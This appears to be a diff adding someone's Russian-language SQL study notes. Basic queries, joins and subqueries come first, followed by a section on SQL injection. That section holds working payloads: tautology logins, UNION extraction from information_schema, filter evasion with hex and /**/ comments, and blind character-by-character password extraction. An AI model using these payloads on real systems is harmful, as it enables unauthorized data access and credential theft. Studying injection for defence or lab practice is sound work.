@@ -1,0 +1,229 @@
+sql
+
+
+
+1)SHOW DATABASES     SQL-команда, которая отвечает за просмотр доступных баз данных.
+
+USE users_dateBase; 
+SELECT * FROM `myTaible` WHERE 1;
+
+SELECT * FROM users.myTaible WHERE 1;
+
+
+
+
+
+--CREATE DATABASE productsdb;
+--USE productsdb;
+CREATE TABLE Customers
+(
+    Id INT PRIMARY KEY AUTO_INCREMENT,
+    Age INT,
+    name VARCHAR(20),
+   
+);
+ 
+
+INSERT INTO `myTaible` (`id`, `name`, `password`) VALUES (NULL, 'pop', '123456'); вставить в таблице данные
+
+
+
+SELECT * FROM users.myTaible WHERE  1 вывод всего
+
+
+
+
+
+
+2)SHOW TABLES  С помощью этой несложной команды можно увидеть все таблицы, которые доступны в базе данных.
+
+
+
+4)DROP TABLE А так можно удалить всю таблицу целиком.
+
+
+5) SELECT далее мы рассмотрим основные команды SQL, которые позволяют работать непосредственно с данными. К одной из таких SQL-команд относится SELECT для получения данных из выбранной таблицы:
+SELECT <col_name1>, <col_name2>, …
+  FROM <table_name>;
+SELECT * FROM <table_name>;Следующей командой можно вывести все данные из таблицы:
+
+
+
+ORDER BY name сортировка 
+
+
+
+LIMIT 1; лимит вывода
+
+
+
+
+
+
+WHERE  name  LIKE '%b%';акже, если мы хотим вывести все альбомы, в названии которых есть буква 'R', мы можем использовать следующую запись:
+Знак % означает любую последовательность символов (0 символов тоже считается за последовательность). LIKE 'п%у%';
+
+COUNT() - возвращает число строк
+SUM() - возвращает сумму всех полей с числовыми значениями в них
+AVG() - возвращает среднее значение среди строк
+MIN()/MAX() - возвращает минимальное/максимальное значение среди строк
+
+
+3)SELECT * FROM `myTaible` WHERE 1 вывод всей таблицы
+
+WHERE типо условия  (WHERE `name`="bob" AND age>`7` OR ....)
+
+IN ("RU", "UA", "BL") ===== country = "RU" OR country = "UA" OR country = "BL"
+
+SELECT * FROM myTaible WHERE name=`пупа`
+
+ select * from users where id=2 or login='$text'
+
+Вместо $text будет наш запрос ' text '
+
+
+
+
+
+
+
+
+4) -- коментарий
+
+
+
+Запрос на авторизацию - запрос к базе данных 
+
+
+
+
+5) обеднение таблиц
+SELECT name FROM Customers WHERE 1
+UNION
+SELECT name FROM myTaible WHERE 1;
+
+
+
+
+
+Обновление 
+UPDATE users
+SET age = 30
+WHERE username = 'Igor';
+
+DELETE FROM users
+WHERE status = 'inactive';
+
+
+
+
+
+Like 
+% означает сколько угодно символов. _ означает точно 1 символ.
+WHERE col LIKE 'foo%' Любые значения, начинающиеся с foo
+WHERE col LIKE '%foo%' Любые значения, содержащие foo
+WHERE col LIKE '%oo' Любые значения, оканчивающиеся на oo
+
+
+
+
+REGEX
+Предложение REGEX позволяет определять регулярное выражение, которому должна соответствовать запись.
+
+^ — начало строки
+$ — конец строки
+. — любой символ
+[символы] — любой из указанных в скобках символов
+[начало-конец] — любой символ из диапазона
+| — разделяет шаблоны
+
+SELECT * FROM users
+WHERE userName REGEXP 'Igor|Vika';
+
+
+
+Соединения
+Соединения (joins) используются для комбинации записей двух и более таблиц.
+SELECT userId, userName, age, amount
+FROM users, orders
+WHERE users.userId = orders.userId;
+
+
+Подзапросы (in)
+Подзапрос — это внутренний (вложенный) запрос другого запроса, встроенный (вставленный) с помощью WHERE или других инструкций.
+SELECT * FROM users
+WHERE userId IN (
+  SELECT userId FROM users
+  WHERE status = 'active'
+);
+
+
+
+
+
+Sql инъекции 
+
+3)' or 1=1 --
+
+4)select * from users where id=2 or login='  -1' union SELECT * FROM secret WHERE  ggg='abc' -- 'limit 1
+
+5)select 1,concat_ws(0x3a,table_name,column_name),3 from information_schema.columns where table_name='myTaible'
+это получкение всех каллон таблицы даже скрытые
+
+(1' union select 1,concat_ws(0x3a,table_name,column_name),3 from information_schema.columns where table_name='secret'-- 123 мы введём это и получим скрытые поля таб(secre) ) далие
+
+select * from users where id=2 or login=' -1' union select 1,dfgdfgfdg,dfgfddfgdfdfdf from secret -- 123 ' limit 1         мы обединим скрытые поля с открытыми от другой таблицы
+
+
+6) фильтр ' " знач перем всегда в скобки брать в этом и проб
+-1 union select * from users where login=0x676f64
+god -> 0x676f64 мы перевили в hex(unicode)
+
+Удобно в бёрп в декоде
+
+
+
+
+7) фильтр  ',",+,=,запятая,пробел,скобки
+
+Пробел /**/
+Рано like  
+-1/**/or/**/login/**/like/**/0x2567656e746f6f25
+
+
+ select * from users.myTaible where id=-1/*! or /*!name*/ like/**/0x2567656e746f6f25  limit 1
+
+
+ 
+
+8)
+
+select * from users where id=-1 union select * from users where login='fast' and pass like '%' 
+И просто перебор пароля
+
+
+Unicode- hex
+ascii code  -dec
+
+
+0 union select * from users where login='fast' and ascii(substr(pass,1,1))<65 типо если это цифра просто по представлению в саки коде проверяем 1 символ
+0 union select * from users where login='fast' and ascii(substr(pass,2,1))=108 типо если вторая буква в слове это буква l 
+ 
+
+
+
+9)
+
+
+
+
+
+
+
+
+
+
+
+
+
+
